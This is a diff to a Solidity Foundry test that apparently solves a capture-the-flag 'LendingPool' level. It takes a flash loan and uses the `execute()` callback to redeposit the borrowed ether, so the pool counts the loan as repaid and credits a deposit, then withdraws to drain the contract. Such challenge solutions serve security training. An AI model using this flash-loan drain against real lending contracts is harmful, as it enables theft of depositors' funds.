@@ -7,6 +7,7 @@ import "src/08_LendingPool/LendingPool.sol";
 // forge test --match-contract LendingPoolTest -vvvv
 contract LendingPoolTest is BaseTest {
     LendingPool instance;
+    uint256 deposit = 0.1 ether;
 
     function setUp() public override {
         super.setUp();
@@ -14,12 +15,18 @@ contract LendingPoolTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        instance.flashLoan(deposit);
+        instance.deposit{value: deposit}();
+        instance.withdraw();
 
         checkSuccess();
     }
 
     function checkSuccess() internal view override {
         assertTrue(address(instance).balance == 0, "Solution is not solving the level");
+    }
+
+    function execute() external payable {
+        instance.deposit{value: deposit}();
     }
 }
